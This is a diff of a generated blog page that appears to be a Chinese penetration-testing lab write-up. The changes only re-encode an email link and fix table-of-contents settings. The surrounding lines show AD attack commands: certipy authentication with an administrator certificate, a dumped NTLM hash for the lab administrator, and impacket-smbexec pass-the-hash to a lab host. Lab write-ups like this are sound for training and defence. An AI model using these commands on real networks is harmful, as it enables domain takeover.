@@ -734,7 +734,7 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221151323.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221151323.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251017221151323"></p>
-<p>Got hash for ‘<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#110;&#x69;&#115;&#116;&#114;&#97;&#x74;&#111;&#x72;&#x40;&#120;&#x69;&#x61;&#111;&#x72;&#x61;&#110;&#x67;&#46;&#x6c;&#x61;&#x62;">&#x61;&#100;&#x6d;&#x69;&#110;&#x69;&#115;&#116;&#114;&#97;&#x74;&#111;&#x72;&#x40;&#120;&#x69;&#x61;&#111;&#x72;&#x61;&#110;&#x67;&#46;&#x6c;&#x61;&#x62;</a>‘: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</p>
+<p>Got hash for ‘<a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#x74;&#111;&#114;&#64;&#x78;&#105;&#x61;&#111;&#x72;&#97;&#x6e;&#103;&#46;&#108;&#x61;&#98;">&#x61;&#x64;&#109;&#x69;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#x74;&#111;&#114;&#64;&#x78;&#105;&#x61;&#111;&#x72;&#97;&#x6e;&#103;&#46;&#108;&#x61;&#98;</a>‘: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26 -codec gbk</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221324859.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221324859.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251017221324859"></p>
@@ -1046,6 +1046,12 @@
       
 <section class="widget side_toc">
   
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
 
   <div class='content'>
     <div class="toc-main">
@@ -1697,7 +1703,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
 
 <script>
-  var headerEl = '',  //headers 
+  var headerEl = 'h2, h3, h4',  //headers 
     content = '.post-detail',//文章容器
     idArr = {};  //标题数组以确定是否增加索引id
   //add #id
@@ -1717,7 +1723,7 @@
     fixedSidebarOffset: 'auto',
     activeLinkClass: 'is-active-link',
     orderedList: true,
-    collapseDepth: ,
+    collapseDepth: 6,
     // onClick: function (e) {},
   }
   if ($('.toc').length > 0) {
